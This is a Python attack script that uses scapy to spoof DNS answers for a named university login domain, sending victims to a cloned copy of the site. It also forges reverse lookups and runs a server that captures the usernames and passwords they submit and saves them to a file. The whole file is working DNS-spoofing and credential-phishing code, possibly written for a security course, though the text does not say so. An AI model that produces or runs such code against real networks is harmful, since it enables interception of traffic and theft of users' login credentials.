import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from http.server import SimpleHTTPRequestHandler, HTTPServer, BaseHTTPRequestHandler
import socketserver
from threading import Thread
from scapy.all import *
from constants import ATTACKER_IP


target_domain = "fs.singaporetech.edu.sg"
cloned_site_dir = "cloned_site"
attacker_server_port = 8080
fake_answer = "PDCSRV.ICT.SIAT.EDU.SG"

# Global variable to stop DNS spoofing
stop_sniffing = False


# Function to start the web server
def start_web_server(port, directory):
    class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)

    handler = CustomHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"Serving at port {port}")
        httpd.serve_forever()

# Function to handle DNS spoofing
def dns_spoof(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:  # QR == 0 means it's a DNS request
        if "in-addr.arpa" in pkt[DNS].qd.qname.decode():
            # Construct the fake DNS response for reverse lookup (PTR record)
            spoofed_pkt = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / \
                          IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, type="PTR", ttl=10, rdata=fake_answer))
            sendp(spoofed_pkt, verbose=0)
            print(f"Sent spoofed reverse DNS response to {pkt[IP].src}")
        elif target_domain in pkt[DNS].qd.qname.decode():
            print(f"Spoofing DNS request for {target_domain}")
            # Construct the DNS response
            spoofed_pkt = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / \
                          IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ATTACKER_IP))
            sendp(spoofed_pkt, verbose=0)
            print(f"Sent spoofed DNS response to {pkt[IP].src}")
            
    # if dns response drop the packet
    if DNS in pkt and pkt[DNS].qr == 1:
        return

def stop_filter(pkt):
    return stop_sniffing

# Define the attacker's server to capture credentials
class StealCredentialsHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        global stop_sniffing
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        parsed_data = parse_qs(post_data.decode('utf-8'))

        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]

        with open("stolen_credentials.txt", "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Credentials stolen successfully")

        # Stop DNS spoofing
        stop_sniffing = True
        print("Credentials obtained. Stopping DNS spoofing...")

# Start the attacker's server
def start_attacker_server():
    server_address = ('', attacker_server_port)
    httpd = HTTPServer(server_address, StealCredentialsHandler)
    print(f"Attacker server running on port {attacker_server_port}")
    httpd.serve_forever()


# Start the web server in a separate thread
web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
web_server_thread.start()

# Start the attacker's server in a separate thread
attacker_server_thread = Thread(target=start_attacker_server)
attacker_server_thread.start()

# Start DNS spoofing
print("Starting DNS spoofing...")
sniff(filter="udp port 53", prn=dns_spoof, stop_filter=stop_filter)
